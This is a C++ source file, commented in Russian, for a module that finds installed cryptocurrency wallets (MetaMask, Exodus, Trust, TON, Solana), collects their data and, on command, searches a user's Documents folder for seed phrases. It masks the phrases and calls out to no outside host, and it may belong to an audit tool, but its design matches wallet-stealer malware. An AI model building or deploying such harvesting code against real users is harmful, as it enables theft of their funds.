#include "internal/crypto_module.h"
#include "internal/logging.h"
#include "internal/crypto/detector.h"
#include "internal/crypto/common.h"
#include "internal/crypto/metamask.h"
#include "internal/crypto/exodus.h"
#include "internal/crypto/trust.h"
#include "internal/crypto/ton.h"
#include "internal/crypto/solana.h"
#include "external/json/json.hpp"
#include "internal/utils/platform_utils.h"
#include "external/json/json.hpp"

namespace mceas {

CryptoModule::CryptoModule() 
    : ModuleBase("CryptoModule", ModuleType::CRYPTO) {
}

CryptoModule::~CryptoModule() {
    if (running_) {
        stop();
    }
}

bool CryptoModule::onInitialize() {
    LogInfo("Initializing Crypto Module");
    
    // Инициализируем анализаторы кошельков
    initAnalyzers();
    
    // Обнаруживаем установленные кошельки
    detectWallets();
    
    return true;
}

bool CryptoModule::onStart() {
    LogInfo("Starting Crypto Module");
    return true;
}

bool CryptoModule::onStop() {
    LogInfo("Stopping Crypto Module");
    return true;
}

ModuleResult CryptoModule::onExecute() {
    LogInfo("Executing Crypto Module");
    
    ModuleResult result;
    result.module_name = getName();
    result.type = getType();
    result.success = true;
    
    try {
        // Собираем данные обо всех обнаруженных кошельках
        for (auto wallet : detected_wallets_) {
            if (wallet) {
                std::string wallet_name = wallet->getName();
                LogInfo("Collecting data from wallet: " + wallet_name);
                
                // Получаем данные от анализатора
                auto wallet_data = wallet->collectData();
                
                // Добавляем данные в результат
                for (const auto& data : wallet_data) {
                    // Используем префикс с именем кошелька, чтобы избежать коллизий
                    std::string key = wallet_name + "." + data.first;
                    addResultData(key, data.second);
                }
            }
        }
        
        // Добавляем информацию о количестве обнаруженных кошельков
        addResultData("wallets.count", std::to_string(detected_wallets_.size()));
        
        // Создаем список обнаруженных типов кошельков
        std::vector<std::string> wallet_types;
        for (auto wallet : detected_wallets_) {
            if (wallet) {
                wallet_types.push_back(wallet->getName());
            }
        }
        
        // Преобразуем в JSON
        if (!wallet_types.empty()) {
            nlohmann::json wallets_json = nlohmann::json::array();
            for (const auto& type : wallet_types) {
                wallets_json.push_back(type);
            }
            addResultData("wallet_types_json", wallets_json.dump());
        }
        
        // Проверяем, есть ли ранее найденные seed-фразы
        if (!seed_phrases_.empty()) {
            addResultData("seed_phrases.count", std::to_string(seed_phrases_.size()));
        }
        
        return result;
    }
    catch (const std::exception& e) {
        LogError("Error executing crypto module: " + std::string(e.what()));
        result.success = false;
        result.error_message = "Error executing crypto module: " + std::string(e.what());
        return result;
    }
}

bool CryptoModule::onHandleCommand(const Command& command) {
    LogInfo("Handling command in Crypto Module: " + command.action);
    
    // Обрабатываем команды
    if (command.action == "scan_wallets") {
        // Повторно сканируем кошельки
        detectWallets();
        return true;
    }
    else if (command.action == "get_wallet_details") {
        // Получаем детали о конкретном кошельке
        auto it = command.parameters.find("wallet");
        if (it != command.parameters.end()) {
            std::string requested_wallet = it->second;
            
            for (auto wallet : detected_wallets_) {
                if (wallet && wallet->getName() == requested_wallet) {
                    // Здесь можно выполнить дополнительные действия
                    LogInfo("Requested details for wallet: " + requested_wallet);
                    return true;
                }
            }
            
            LogWarning("Wallet not found: " + requested_wallet);
            return false;
        }
        
        LogWarning("Missing wallet parameter in command");
        return false;
    }
    else if (command.action == "search_seed_phrases") {
        // Ищем seed-фразы в указанной директории
        auto it = command.parameters.find("path");
        std::string search_path;
        
        if (it != command.parameters.end()) {
            search_path = it->second;
        } else {
            // Если путь не указан, используем домашнюю директорию
            const char* home_dir = std::getenv("HOME");
            if (home_dir) {
                search_path = std::string(home_dir) + "/Documents";
            }
        }
        
        if (!search_path.empty()) {
            seed_phrases_ = searchSeedPhrases(search_path);
            
            // Добавляем информацию о найденных фразах в результат
            addResultData("seed_phrases.count", std::to_string(seed_phrases_.size()));
            
            if (!seed_phrases_.empty()) {
                nlohmann::json phrases_json = nlohmann::json::array();
                
                for (const auto& phrase : seed_phrases_) {
                    nlohmann::json phrase_json;
                    phrase_json["file_path"] = phrase.file_path;
                    phrase_json["content"] = phrase.content;  // Уже замаскировано в searchSeedPhrases
                    phrase_json["type"] = phrase.type;
                    phrase_json["word_count"] = phrase.word_count;
                    phrase_json["confidence"] = phrase.confidence;
                    
                    phrases_json.push_back(phrase_json);
                }
                
                addResultData("seed_phrases_json", phrases_json.dump());
            }
            
            return true;
        }
        
        LogWarning("Invalid path for seed phrase search");
        return false;
    }
    
    LogWarning("Unknown command action: " + command.action);
    return false;
}

void CryptoModule::initAnalyzers() {
    // Инициализируем детектор и получаем список анализаторов
    try {
        WalletDetector detector;
        analyzers_ = detector.detectInstalledWallets();
        
        LogInfo("Initialized " + std::to_string(analyzers_.size()) + " wallet analyzers");
    }
    catch (const std::exception& e) {
        LogError("Failed to initialize wallet analyzers: " + std::string(e.what()));
    }
}

void CryptoModule::detectWallets() {
    LogInfo("Detecting installed wallets");
    
    // Очищаем список обнаруженных кошельков
    detected_wallets_.clear();
    
    // Проверяем установленные кошельки
    for (const auto& analyzer : analyzers_) {
        if (analyzer->isInstalled()) {
            LogInfo("Detected wallet: " + analyzer->getName() + 
                    ", version: " + analyzer->getVersion());
            detected_wallets_.push_back(analyzer.get());
        }
    }
    
    LogInfo("Total wallets detected: " + std::to_string(detected_wallets_.size()));
}

std::vector<crypto::SeedPhraseInfo> CryptoModule::searchSeedPhrases(const std::string& directory_path) {
    LogInfo("Starting seed phrase search in: " + directory_path);
    
    // Используем функцию из crypto::common
    auto results = crypto::findPotentialSeedPhrases(directory_path, true);  // Маскируем фразы для безопасности
    
    LogInfo("Seed phrase search completed. Found " + std::to_string(results.size()) + " potential phrases");
    
    return results;
}

} // namespace mceas